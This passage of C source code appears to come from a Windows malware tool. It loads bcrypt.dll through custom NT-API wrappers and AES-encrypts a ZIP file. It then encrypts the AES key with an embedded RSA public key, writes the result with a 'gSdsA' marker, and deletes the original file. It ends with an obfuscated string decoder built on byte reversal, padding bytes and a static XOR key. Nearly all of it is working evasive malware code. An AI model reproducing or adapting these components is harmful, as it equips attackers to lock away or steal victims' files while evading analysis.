    ULONG dllCharacteristics = 0; // No special characteristics for loading the DLL
    PVOID moduleHandle = NULL;    // Handle for the loaded module

    // Load bcrypt.dll and check if it was loaded successfully.
    NTSTATUS STATUS = LoadLib(NULL, &dllCharacteristics, &dllName, &moduleHandle);
    if (!NT_SUCCESS(STATUS) || moduleHandle == NULL) {
        WARN("Failed to load bcrypt.dll. STATUS: %08x\n", STATUS);
        return -1;
    } else {
        INFO("bcrypt.dll loaded successfully.");
    }

    // Retrieve the address of BCryptOpenAlgorithmProvider function from bcrypt.dll.
    ANSI_STRING procName;
    CHAR procNameBuffer[] = "BCryptOpenAlgorithmProvider";
    procName.Length = (USHORT)strlen(procNameBuffer); // Set function name length
    procName.MaximumLength = procName.Length + 1;     // Account for null terminator
    procName.Buffer = procNameBuffer;                 // Set the buffer to point to the function name
    PVOID BCryptOpenAlgorithmProviderProcAddress = NULL; // Address for the function
    NTSTATUS STATUS0 = GetProcAdd(moduleHandle, &procName, 0, &BCryptOpenAlgorithmProviderProcAddress);
    if (!NT_SUCCESS(STATUS0) || BCryptOpenAlgorithmProviderProcAddress == NULL) {
        WARN("Failed to get BCryptOpenAlgorithmProvider address. STATUS0: %08x\n", STATUS0);
        UnloadLib(moduleHandle);
        return -2;
    }
    BCryptOpenAlgorithmProvider_t pBCryptOpenAlgorithmProvider = (BCryptOpenAlgorithmProvider_t)BCryptOpenAlgorithmProviderProcAddress;

    // Retrieve the address of BCryptImportKeyPair function from bcrypt.dll.
    ANSI_STRING procName1;
    CHAR procNameBuffer1[] = "BCryptImportKeyPair";
    procName1.Length = (USHORT)strlen(procNameBuffer1); // Set function name length
    procName1.MaximumLength = procName1.Length + 1;     // Account for null terminator
    procName1.Buffer = procNameBuffer1;                 // Set the buffer to point to the function name
    PVOID BCryptImportKeyPairProcAddress = NULL; // Address for the function
    NTSTATUS STATUS1 = GetProcAdd(moduleHandle, &procName1, 0, &BCryptImportKeyPairProcAddress);
    if (!NT_SUCCESS(STATUS1) || BCryptImportKeyPairProcAddress == NULL) {
        WARN("Failed to get BCryptImportKeyPair address. STATUS1: %08x\n", STATUS1);
        UnloadLib(moduleHandle);
        return -2;
    }
    BCryptImportKeyPair_t pBCryptImportKeyPair = (BCryptImportKeyPair_t)BCryptImportKeyPairProcAddress;

    // Retrieve the address of BCryptCloseAlgorithmProvider function from bcrypt.dll.
    ANSI_STRING procName2;
    CHAR procNameBuffer2[] = "BCryptCloseAlgorithmProvider";
    procName2.Length = (USHORT)strlen(procNameBuffer2); // Set function name length
    procName2.MaximumLength = procName2.Length + 1;     // Account for null terminator
    procName2.Buffer = procNameBuffer2;                 // Set the buffer to point to the function name
    PVOID BCryptCloseAlgorithmProviderProcAddress = NULL; // Address for the function
    NTSTATUS STATUS2 = GetProcAdd(moduleHandle, &procName2, 0, &BCryptCloseAlgorithmProviderProcAddress);
    if (!NT_SUCCESS(STATUS2) || BCryptCloseAlgorithmProviderProcAddress == NULL) {
        WARN("Failed to get BCryptCloseAlgorithmProvider address. STATUS2: %08x\n", STATUS2);
        UnloadLib(moduleHandle);
        return -2;
    }
    BCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider = (BCryptCloseAlgorithmProvider_t)BCryptCloseAlgorithmProviderProcAddress;

    // Retrieve the address of BCryptEncrypt function from bcrypt.dll.
    ANSI_STRING procName3;
    CHAR procNameBuffer3[] = "BCryptEncrypt";
    procName3.Length = (USHORT)strlen(procNameBuffer3); // Set function name length
    procName3.MaximumLength = procName3.Length + 1;     // Account for null terminator
    procName3.Buffer = procNameBuffer3;                 // Set the buffer to point to the function name
    PVOID BCryptEncryptProcAddress = NULL; // Address for the function
    NTSTATUS STATUS3 = GetProcAdd(moduleHandle, &procName3, 0, &BCryptEncryptProcAddress);
    if (!NT_SUCCESS(STATUS3) || BCryptEncryptProcAddress == NULL) {
        WARN("Failed to get BCryptEncrypt address. STATUS3: %08x\n", STATUS3);
        UnloadLib(moduleHandle);
        return -2;
    }
    BCryptEncrypt_t pBCryptEncrypt = (BCryptEncrypt_t)BCryptEncryptProcAddress;

    // Retrieve the address of BCryptDestroyKey function from bcrypt.dll.
    ANSI_STRING procName4;
    CHAR procNameBuffer4[] = "BCryptDestroyKey";
    procName4.Length = (USHORT)strlen(procNameBuffer4); // Set function name length
    procName4.MaximumLength = procName4.Length + 1;     // Account for null terminator
    procName4.Buffer = procNameBuffer4;                 // Set the buffer to point to the function name
    PVOID BCryptDestroyKeyProcAddress = NULL; // Address for the function
    NTSTATUS STATUS4 = GetProcAdd(moduleHandle, &procName4, 0, &BCryptDestroyKeyProcAddress);
    if (!NT_SUCCESS(STATUS4) || BCryptDestroyKeyProcAddress == NULL) {
        WARN("Failed to get BCryptDestroyKey address. STATUS4: %08x\n", STATUS4);
        UnloadLib(moduleHandle);
        return -2;
    }
    BCryptDestroyKey_t pBCryptDestroyKey = (BCryptDestroyKey_t)BCryptDestroyKeyProcAddress;

    // Retrieve the address of BCryptGenRandom function from bcrypt.dll.
    ANSI_STRING procName5;
    CHAR procNameBuffer5[] = "BCryptGenRandom";
    procName5.Length = (USHORT)strlen(procNameBuffer5); // Set function name length
    procName5.MaximumLength = procName5.Length + 1;     // Account for null terminator
    procName5.Buffer = procNameBuffer5;                 // Set the buffer to point to the function name
    PVOID BCryptGenRandomProcAddress = NULL; // Address for the function
    NTSTATUS STATUS5 = GetProcAdd(moduleHandle, &procName5, 0, &BCryptGenRandomProcAddress);
    if (!NT_SUCCESS(STATUS5) || BCryptGenRandomProcAddress == NULL) {
        WARN("Failed to get BCryptGenRandom address. STATUS5: %08x\n", STATUS5);
        UnloadLib(moduleHandle);
        return -2;
    }
    BCryptGenRandom_t pBCryptGenRandom = (BCryptGenRandom_t)BCryptGenRandomProcAddress;

    // Retrieve the address of BCryptGenRandom function from bcrypt.dll.
    ANSI_STRING procName6;
    CHAR procNameBuffer6[] = "BCryptGenerateSymmetricKey";
    procName6.Length = (USHORT)strlen(procNameBuffer6); // Set function name length
    procName6.MaximumLength = procName6.Length + 1;     // Account for null terminator
    procName6.Buffer = procNameBuffer6;                 // Set the buffer to point to the function name
    PVOID BCryptGenerateSymmetricKeyProcAddress = NULL; // Address for the function
    NTSTATUS STATUS6 = GetProcAdd(moduleHandle, &procName6, 0, &BCryptGenerateSymmetricKeyProcAddress);
    if (!NT_SUCCESS(STATUS6) || BCryptGenerateSymmetricKeyProcAddress == NULL) {
        WARN("Failed to get BCryptGenerateSymmetricKey address. STATUS6: %08x\n", STATUS6);
        UnloadLib(moduleHandle);
        return -2;
    }
    BCryptGenerateSymmetricKey_t pBCryptGenerateSymmetricKey = (BCryptGenerateSymmetricKey_t)BCryptGenerateSymmetricKeyProcAddress;


    INFO("Got addresses of all needed functions from bcrypt.dll");










    // Read input file
    FILE *InputDataRead = fopen(file, "rb");                                                         // Open ZIP file for reading
    fseek(InputDataRead, 0, SEEK_END);                                                               // Seek the file to get the length
	unsigned long fileLen = ftell(InputDataRead);                                                    // Get length
	fseek(InputDataRead, 0, SEEK_SET);                                                               // Reset seek pointer
    char *FileDataBuffer = (char *) malloc(fileLen);                                                 // Allocate memory
    if (!FileDataBuffer) { WARN("Memory error. L736 crypto.c"); fclose(InputDataRead); return -1; }  // Handle errors
    fread(FileDataBuffer, fileLen, 1, InputDataRead);                                                // Read file data to the buffer
	fclose(InputDataRead);                                                                           // Close the file
    size_t InputDataSize = fileLen;                                                                  // Set size_t InputDataSize to the fileLen

    // AES Encrypt the file data
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    NTSTATUS statusAES;
    statusAES = pBCryptOpenAlgorithmProvider(&hAesAlg, L"AES", NULL, 0);
    if (!NT_SUCCESS(statusAES)) {
        WARN("BCryptOpenAlgorithmProvider failed: 0x%x\n", statusAES);
        return -1;
    }
    BYTE aesKey[32];
    statusAES = pBCryptGenRandom(NULL, aesKey, sizeof(aesKey), 0x00000002);
    if (!NT_SUCCESS(statusAES)) {
        WARN("BCryptGenRandom failed: 0x%x\n", statusAES);
        pBCryptCloseAlgorithmProvider(hAesAlg, 0);
        return -1;
    }
    BCRYPT_KEY_HANDLE hKeyAes = NULL;
    statusAES = pBCryptGenerateSymmetricKey(hAesAlg, &hKeyAes, NULL, 0, aesKey, sizeof(aesKey), 0);
    if (!NT_SUCCESS(statusAES)) {
        WARN("BCryptGenerateSymmetricKey failed: 0x%x", statusAES);
        pBCryptCloseAlgorithmProvider(hAesAlg, 0);
        return -1;
    }
    BYTE iv[16] = { 0 };
    ULONG AESencryptedBufferSize = 0;
    statusAES = pBCryptEncrypt(hKeyAes, (PUCHAR)FileDataBuffer, InputDataSize, NULL, iv, sizeof(iv), NULL, 0, &AESencryptedBufferSize, 0x00000001);
    if (!NT_SUCCESS(statusAES)) {
        WARN("Failed to get required size for AES encrypted buffer..statusAES: 0x%x", statusAES);
        pBCryptDestroyKey(hKeyAes);
        pBCryptCloseAlgorithmProvider(hAesAlg, 0);
        free(FileDataBuffer);
        return -1;
    }
    PUCHAR AESencryptedBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, AESencryptedBufferSize);
    if (AESencryptedBuffer == NULL) {
        WARN("Failed to allocate memory for encrypted buffer.");
        pBCryptDestroyKey(hKeyAes);
        pBCryptCloseAlgorithmProvider(hAesAlg, 0);
        free(FileDataBuffer);
        return -1;
    }
    statusAES = pBCryptEncrypt(hKeyAes, (PUCHAR)FileDataBuffer, InputDataSize, NULL, iv, sizeof(iv), AESencryptedBuffer, AESencryptedBufferSize, &AESencryptedBufferSize, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(statusAES)) {
        WARN("Failed to encrypt file data using AES..statusAES: 0x%x", statusAES);
        HeapFree(GetProcessHeap(), 0, AESencryptedBuffer);
        pBCryptDestroyKey(hKeyAes);
        pBCryptCloseAlgorithmProvider(hAesAlg, 0);
        free(FileDataBuffer);
        return -1;
    }









    size_t PublicKeyLength = sizeof(PublicKey);
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status = 0;
    ULONG encryptedBufferSize = 0;
    PUCHAR encryptedBuffer = NULL;

    // Open an algorithm handle for RSA
    status = pBCryptOpenAlgorithmProvider(&hAlgorithm, L"RSA", NULL, 0);
    if (!NT_SUCCESS(status)) {
        WARN("BCryptOpenAlgorithmProvider failed: 0x%x", status);
        return -1;
    }

    // Import the public key for encryption
    status = pBCryptImportKeyPair(hAlgorithm, NULL, L"RSAPUBLICBLOB", &hKey, PublicKey, PublicKeyLength, 0x00000008);
    if (!NT_SUCCESS(status)) {
        WARN("Failed to import public key..status : %08x", status);
        pBCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    // Get the required size for the encrypted buffer
    status = pBCryptEncrypt(hKey, aesKey, 32, NULL, NULL, 0, NULL, 0, &encryptedBufferSize, 0x00000002);
    if (!NT_SUCCESS(status)) {
        WARN("Failed to get required size of buffer..status : %08x", status);
        pBCryptDestroyKey(hKey);
        pBCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }

    // Allocate memory for the encrypted buffer
    encryptedBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encryptedBufferSize);
    if (encryptedBuffer == NULL) {
        WARN("Failed to allocate memory for encrypted buffer.");
        pBCryptDestroyKey(hKey);
        pBCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return -1;
    }
    status = pBCryptEncrypt(hKey, aesKey, 32, NULL, NULL, 0, encryptedBuffer, encryptedBufferSize, &encryptedBufferSize, 0x00000002);
    if (!NT_SUCCESS(status)) {
        WARN("Failed to encrypt data..status : %08x", status);
        HeapFree(GetProcessHeap(), 0, encryptedBuffer);
        pBCryptDestroyKey(hKey);
        pBCryptCloseAlgorithmProvider(hAlgorithm, 0); 
        return -1;
    }

    // Print the AES Key and the RSA Encrypted AES Key (because of verbose version!)
    INFO("AES Encryption key:");
    PrintHex(aesKey, 32);

    INFO("RSA Encrypted AES Encryption Key:");
    PrintHex(encryptedBuffer, encryptedBufferSize);




    // Base64 encode the RSA Encrypted key
    char base64EncodedRSAEncryptedKey[500];
    DWORD base64EncodedRSAEncryptedKeySize = sizeof(base64EncodedRSAEncryptedKey);
    Base64EncodingFunc(encryptedBuffer, encryptedBufferSize, base64EncodedRSAEncryptedKey, base64EncodedRSAEncryptedKeySize);
    INFO("BASE64 Encoded (RSA Encrypted AES Key):\n%s", base64EncodedRSAEncryptedKey);

    // Concatenate the AESencryptedBuffer + Magic string ("gSdsA") + Base64 encoded key. Afterwards write it to the output file.
    DWORD magicStringSize = strlen("gSdsA");
    DWORD base64EncodedRSAEncryptedKeySizeDword = strlen(base64EncodedRSAEncryptedKey);
    BYTE *FULLENCRYPTFILEDATA = (BYTE *)malloc(AESencryptedBufferSize + magicStringSize + base64EncodedRSAEncryptedKeySizeDword);
    memcpy(FULLENCRYPTFILEDATA, AESencryptedBuffer, AESencryptedBufferSize);
    memcpy(FULLENCRYPTFILEDATA + AESencryptedBufferSize, "gSdsA", magicStringSize);
    memcpy(FULLENCRYPTFILEDATA + AESencryptedBufferSize + magicStringSize, base64EncodedRSAEncryptedKey, base64EncodedRSAEncryptedKeySizeDword);

    // Write the AES encrypted data, magic string and Base64 encoded RSA output.
    FILE *OutputWrite = fopen(fileOut, "wb");
    if (OutputWrite == NULL) {
        WARN("Failed to open the output file.");
        free(FULLENCRYPTFILEDATA);
        return -1;
    }
    fwrite(FULLENCRYPTFILEDATA, AESencryptedBufferSize + magicStringSize + base64EncodedRSAEncryptedKeySizeDword, 1, OutputWrite);
    fclose(OutputWrite);


    // Cleanup
    HeapFree(GetProcessHeap(), 0, encryptedBuffer);    // Free heap allocation RSA encrypted AES key.
    HeapFree(GetProcessHeap(), 0, AESencryptedBuffer); // Free heap allocation for AES encrypted data.
    pBCryptCloseAlgorithmProvider(hAlgorithm, 0);      // Close Algorithm Provider.
    pBCryptCloseAlgorithmProvider(hAesAlg, 0);         // Close Algorithm Provider.
    pBCryptDestroyKey(hKey);                           // Destroy BCRYPT_KEY_HANDLE.
    pBCryptDestroyKey(hKeyAes);                        // Destroy BCRYPT_KEY_HANDLE.
    free(FULLENCRYPTFILEDATA);                         // Free the buffer used to store full output file data.
    free(FileDataBuffer);                              // Free the buffer used to store the ZIP file data.
    UnloadLib(moduleHandle);                           // Unload the DLL loaded through NtAPI LoadLibrary.
    unlink(file);                                      // Remove the non-encrypted input file.

    return 0;
}

void AddRandomBytes(unsigned char *input, size_t length) {
    // 3 Uncommon bytes to add between the input byte array (* 3). We take 5 of them randomly.
    unsigned char uncommon_bytes[9] = {0xF1, 0xAA, 0xC3, 0xF1, 0xAA, 0xC3, 0xF1, 0xAA, 0xC3};

    unsigned char *new_memory = malloc(length + 5);
    for (size_t i = 0; i < length + 5; i++) { new_memory[i] = 0x00; }
    srand(time(NULL));

    for (int i = 0; i < 5; i++) {
        unsigned char random_byte = uncommon_bytes[rand() % 9];
        size_t random_position;
        do {
            random_position = (rand() % (length + 4)) + 1;
        } while (new_memory[random_position] != 0x00);
        
        new_memory[random_position] = random_byte;
    }

    size_t input_index = 0;
    for (size_t i = 0; i < length + 5; i++) {
        if (new_memory[i] == 0x00 && input_index < length) {
            new_memory[i] = input[input_index++];
        }
    }

    memcpy(input, new_memory, length + 5);
    free(new_memory);
    return;
}

void RemoveBytes(unsigned char *ByteArr, int ByteArrLength) {
    int new_len = ByteArrLength - 5;
    unsigned char *cleaned = malloc(new_len);
    int index = 0;

    // Loop through the char array and remove the "uncommon" characters.
    for (int i = 0; i < ByteArrLength; i++) {
        if ((ByteArr[i] != 0xF1) &&
            (ByteArr[i] != 0xAA) &&
            (ByteArr[i] != 0xC3) ) {
                cleaned[index] = ByteArr[i];
                index += 1;
            }
    }
    memcpy(ByteArr, cleaned, new_len);
    free(cleaned);
    return;
}
void XOR(char *input, char *output, const char *key, int length)
{
    int key_len = strlen(key);
    for (int i = 0; i < length; ++i)
        output[i] = input[i] ^ key[i % key_len];
}
void Reverse(unsigned char *data, int len)
{
    for (int i = 0; i < len / 2; ++i)
    {
        unsigned char temp = data[i];
        data[i] = data[len - i - 1];
        data[len - i - 1] = temp;
    }
}

char *BizFumEncodingDecode(char *Input)
{
    // Step 1: Base64 Decode.
    char *in = NULL;
    DWORD inSize;
    Base64DecodingFunc(Input, &in, &inSize);


    // Step 2: Split back into pieces.
    int Remainder = in[inSize - 2] - '0';
    int BaseSize = in[inSize - 1] - '0';

    int Offset = 0;
    unsigned char *STR14;
    unsigned char *STR1 = malloc(5);
    unsigned char *STR2 = malloc(5);
    unsigned char *STR3 = malloc(5);
    unsigned char *STR4 = malloc(5);
    unsigned char *STR5 = malloc(5);
    unsigned char *STR6 = malloc(5);
    unsigned char *STR7 = malloc(5);
    unsigned char *STR8 = malloc(5);
    unsigned char *STR9 = malloc(5);
    unsigned char *STR10 = malloc(5);
    unsigned char *STR11 = malloc(5);
    unsigned char *STR12 = malloc(5);
    unsigned char *STR13 = malloc(5);
    unsigned char *LeftOver = malloc(Remainder);
    if (BaseSize == 9)
    {
        STR14 = malloc(5);
    }

    if (Remainder > 0)
    {
        memcpy(LeftOver, in + Offset, Remainder);
        Offset += Remainder;
    }
    if (BaseSize == 9)
    {
        memcpy(STR14, in + Offset, 5);
        Offset += 5;
    }
    memcpy(STR13, in + Offset, 5);
    Offset += 5;
    memcpy(STR12, in + Offset, 5);
    Offset += 5;
    memcpy(STR11, in + Offset, 5);
    Offset += 5;
    memcpy(STR10, in + Offset, 5);
    Offset += 5;
    memcpy(STR9, in + Offset, 5);
    Offset += 5;
    memcpy(STR8, in + Offset, 5);
    Offset += 5;
    memcpy(STR7, in + Offset, 5);
    Offset += 5;
    memcpy(STR6, in + Offset, 5);
    Offset += 5;
    memcpy(STR5, in + Offset, 5);
    Offset += 5;
    memcpy(STR4, in + Offset, 5);
    Offset += 5;
    memcpy(STR3, in + Offset, 5);
    Offset += 5;
    memcpy(STR2, in + Offset, 5);
    Offset += 5;
    memcpy(STR1, in + Offset, 5);
    Offset += 5;

    Reverse(STR1, 5);
    Reverse(STR2, 5);
    Reverse(STR3, 5);
    Reverse(STR4, 5);
    Reverse(STR5, 5);
    Reverse(STR6, 5);
    Reverse(STR7, 5);
    Reverse(STR8, 5);
    Reverse(STR9, 5);
    Reverse(STR10, 5);
    Reverse(STR11, 5);
    Reverse(STR12, 5);
    Reverse(STR13, 5);
    if (BaseSize == 9)
    {
        Reverse(STR14, 5);
    }
    if (Remainder > 0)
    {
        Reverse(LeftOver, Remainder);
    }



    // Step 3: Flip back the bytes.
    // Here we are basically flipping the rows from X-axis to Y-axis, but in reverse way.
    // Example:
    // 04 05       becomes      04 01 09
    // 01 02                    05 02 05
    // 09 05
    int MaxRow;
    if (BaseSize == 9)
    {
        MaxRow = 14;
    }
    else
    {
        MaxRow = 13;
    }
    unsigned char *XOR1withRandomBytes = malloc(MaxRow);
    unsigned char *XOR2withRandomBytes = malloc(MaxRow);
    unsigned char *XOR3withRandomBytes = malloc(MaxRow);
    unsigned char *XOR4withRandomBytes = malloc(MaxRow);
    unsigned char *XOR5withRandomBytes = malloc(MaxRow + Remainder);
    int STRindex = 0;

    for (int i = 0; i < MaxRow; i++)
    {
        if (i == 0)
        {
            XOR1withRandomBytes[i] = STR1[STRindex];
        }
        if (i == 1)
        {
            XOR1withRandomBytes[i] = STR2[STRindex];
        }
        if (i == 2)
        {
            XOR1withRandomBytes[i] = STR3[STRindex];
        }
        if (i == 3)
        {
            XOR1withRandomBytes[i] = STR4[STRindex];
        }
        if (i == 4)
        {
            XOR1withRandomBytes[i] = STR5[STRindex];
        }
        if (i == 5)
        {
            XOR1withRandomBytes[i] = STR6[STRindex];
        }
        if (i == 6)
        {
            XOR1withRandomBytes[i] = STR7[STRindex];
        }
        if (i == 7)
        {
            XOR1withRandomBytes[i] = STR8[STRindex];
        }
        if (i == 8)
        {
            XOR1withRandomBytes[i] = STR9[STRindex];
        }
        if (i == 9)
        {
            XOR1withRandomBytes[i] = STR10[STRindex];
        }
        if (i == 10)
        {
            XOR1withRandomBytes[i] = STR11[STRindex];
        }
        if (i == 11)
        {
            XOR1withRandomBytes[i] = STR12[STRindex];
        }
        if (i == 12)
        {
            XOR1withRandomBytes[i] = STR13[STRindex];
        }
        if ((i == 13) && MaxRow == 14)
        {
            XOR1withRandomBytes[i] = STR14[STRindex];
        }
    }
    STRindex += 1;
    for (int i = 0; i < MaxRow; i++)
    {
        if (i == 0)
        {
            XOR2withRandomBytes[i] = STR1[STRindex];
        }
        if (i == 1)
        {
            XOR2withRandomBytes[i] = STR2[STRindex];
        }
        if (i == 2)
        {
            XOR2withRandomBytes[i] = STR3[STRindex];
        }
        if (i == 3)
        {
            XOR2withRandomBytes[i] = STR4[STRindex];
        }
        if (i == 4)
        {
            XOR2withRandomBytes[i] = STR5[STRindex];
        }
        if (i == 5)
        {
            XOR2withRandomBytes[i] = STR6[STRindex];
        }
        if (i == 6)
        {
            XOR2withRandomBytes[i] = STR7[STRindex];
        }
        if (i == 7)
        {
            XOR2withRandomBytes[i] = STR8[STRindex];
        }
        if (i == 8)
        {
            XOR2withRandomBytes[i] = STR9[STRindex];
        }
        if (i == 9)
        {
            XOR2withRandomBytes[i] = STR10[STRindex];
        }
        if (i == 10)
        {
            XOR2withRandomBytes[i] = STR11[STRindex];
        }
        if (i == 11)
        {
            XOR2withRandomBytes[i] = STR12[STRindex];
        }
        if (i == 12)
        {
            XOR2withRandomBytes[i] = STR13[STRindex];
        }
        if ((i == 13) && MaxRow == 14)
        {
            XOR2withRandomBytes[i] = STR14[STRindex];
        }
    }
    STRindex += 1;
    for (int i = 0; i < MaxRow; i++)
    {
        if (i == 0)
        {
            XOR3withRandomBytes[i] = STR1[STRindex];
        }
        if (i == 1)
        {
            XOR3withRandomBytes[i] = STR2[STRindex];
        }
        if (i == 2)
        {
            XOR3withRandomBytes[i] = STR3[STRindex];
        }
        if (i == 3)
        {
            XOR3withRandomBytes[i] = STR4[STRindex];
        }
        if (i == 4)
        {
            XOR3withRandomBytes[i] = STR5[STRindex];
        }
        if (i == 5)
        {
            XOR3withRandomBytes[i] = STR6[STRindex];
        }
        if (i == 6)
        {
            XOR3withRandomBytes[i] = STR7[STRindex];
        }
        if (i == 7)
        {
            XOR3withRandomBytes[i] = STR8[STRindex];
        }
        if (i == 8)
        {
            XOR3withRandomBytes[i] = STR9[STRindex];
        }
        if (i == 9)
        {
            XOR3withRandomBytes[i] = STR10[STRindex];
        }
        if (i == 10)
        {
            XOR3withRandomBytes[i] = STR11[STRindex];
        }
        if (i == 11)
        {
            XOR3withRandomBytes[i] = STR12[STRindex];
        }
        if (i == 12)
        {
            XOR3withRandomBytes[i] = STR13[STRindex];
        }
        if ((i == 13) && MaxRow == 14)
        {
            XOR3withRandomBytes[i] = STR14[STRindex];
        }
    }
    STRindex += 1;
    for (int i = 0; i < MaxRow; i++)
    {
        if (i == 0)
        {
            XOR4withRandomBytes[i] = STR1[STRindex];
        }
        if (i == 1)
        {
            XOR4withRandomBytes[i] = STR2[STRindex];
        }
        if (i == 2)
        {
            XOR4withRandomBytes[i] = STR3[STRindex];
        }
        if (i == 3)
        {
            XOR4withRandomBytes[i] = STR4[STRindex];
        }
        if (i == 4)
        {
            XOR4withRandomBytes[i] = STR5[STRindex];
        }
        if (i == 5)
        {
            XOR4withRandomBytes[i] = STR6[STRindex];
        }
        if (i == 6)
        {
            XOR4withRandomBytes[i] = STR7[STRindex];
        }
        if (i == 7)
        {
            XOR4withRandomBytes[i] = STR8[STRindex];
        }
        if (i == 8)
        {
            XOR4withRandomBytes[i] = STR9[STRindex];
        }
        if (i == 9)
        {
            XOR4withRandomBytes[i] = STR10[STRindex];
        }
        if (i == 10)
        {
            XOR4withRandomBytes[i] = STR11[STRindex];
        }
        if (i == 11)
        {
            XOR4withRandomBytes[i] = STR12[STRindex];
        }
        if (i == 12)
        {
            XOR4withRandomBytes[i] = STR13[STRindex];
        }
        if ((i == 13) && MaxRow == 14)
        {
            XOR4withRandomBytes[i] = STR14[STRindex];
        }
    }
    STRindex += 1;
    for (int i = 0; i < MaxRow + Remainder; i++)
    {
        if (i == 0)
        {
            XOR5withRandomBytes[i] = STR1[STRindex];
        }
        if (i == 1)
        {
            XOR5withRandomBytes[i] = STR2[STRindex];
        }
        if (i == 2)
        {
            XOR5withRandomBytes[i] = STR3[STRindex];
        }
        if (i == 3)
        {
            XOR5withRandomBytes[i] = STR4[STRindex];
        }
        if (i == 4)
        {
            XOR5withRandomBytes[i] = STR5[STRindex];
        }
        if (i == 5)
        {
            XOR5withRandomBytes[i] = STR6[STRindex];
        }
        if (i == 6)
        {
            XOR5withRandomBytes[i] = STR7[STRindex];
        }
        if (i == 7)
        {
            XOR5withRandomBytes[i] = STR8[STRindex];
        }
        if (i == 8)
        {
            XOR5withRandomBytes[i] = STR9[STRindex];
        }
        if (i == 9)
        {
            XOR5withRandomBytes[i] = STR10[STRindex];
        }
        if (i == 10)
        {
            XOR5withRandomBytes[i] = STR11[STRindex];
        }
        if (i == 11)
        {
            XOR5withRandomBytes[i] = STR12[STRindex];
        }
        if (i == 12)
        {
            XOR5withRandomBytes[i] = STR13[STRindex];
        }
        if ((i == 13) && MaxRow == 14)
        {
            XOR5withRandomBytes[i] = STR14[STRindex];
        }
    }
    STRindex += 1;
    for (int i = 0; i < Remainder; i++)
    {
        if (Remainder > 0)
        {
            if (MaxRow == 14)
            {
                XOR5withRandomBytes[14 + i] = LeftOver[i];
            }
            if (MaxRow == 13)
            {
                XOR5withRandomBytes[13 + i] = LeftOver[i];
            }
        }
    }



    // Step 4: Remove added random bytes.
    int PART1_AfterRandRemove = MaxRow - 5;
    int PART2_AfterRandRemove = MaxRow - 5;
    int PART3_AfterRandRemove = MaxRow - 5;
    int PART4_AfterRandRemove = MaxRow - 5;
    int PART5_AfterRandRemove = MaxRow + Remainder - 5;
    RemoveBytes(XOR1withRandomBytes, MaxRow);
    RemoveBytes(XOR2withRandomBytes, MaxRow);
    RemoveBytes(XOR3withRandomBytes, MaxRow);
    RemoveBytes(XOR4withRandomBytes, MaxRow);
    RemoveBytes(XOR5withRandomBytes, MaxRow + Remainder);


    // Step 5: XOR Decrypt.
    char PART1[11];
    char PART2[11];
    char PART3[11];
    char PART4[11];
    char PART5[11];
    XOR(XOR1withRandomBytes, PART1, STATIC_KEY, PART1_AfterRandRemove);
    XOR(XOR2withRandomBytes, PART2, STATIC_KEY, PART2_AfterRandRemove);
    XOR(XOR3withRandomBytes, PART3, STATIC_KEY, PART3_AfterRandRemove);
    XOR(XOR4withRandomBytes, PART4, STATIC_KEY, PART4_AfterRandRemove);
    XOR(XOR5withRandomBytes, PART5, STATIC_KEY, PART5_AfterRandRemove);
    PART1[BaseSize]             = '\0';
    PART2[BaseSize]             = '\0';
    PART3[BaseSize]             = '\0';
    PART4[BaseSize]             = '\0';
    PART5[BaseSize + Remainder] = '\0';
    
    // Quick check to make sure that all are over 0 characters long; if not, run the function again, with the same input, until all are > 0.
    if ( (strlen(PART1) <= 1) || (strlen(PART2) <= 1) || (strlen(PART3) <= 1) || (strlen(PART4) <= 1) || (strlen(PART5) <= 1) ) {
        free(XOR1withRandomBytes);
        free(XOR2withRandomBytes);
        free(XOR3withRandomBytes);
        free(XOR4withRandomBytes);
        free(XOR5withRandomBytes);
        BizFumEncodingDecode(Input);
    }

    
    // Step 6: Concatinate strings.
    static char output[50]; // I know this is not the smartest way probably, but shall NOT cause problems, since the function is only ever called once.
    sprintf(output, "%s%s%s%s%s", PART1, PART2, PART3, PART4, PART5);


    // Clean
    free(XOR1withRandomBytes);
    free(XOR2withRandomBytes);
    free(XOR3withRandomBytes);
    free(XOR4withRandomBytes);
    free(XOR5withRandomBytes);
    return output;
}
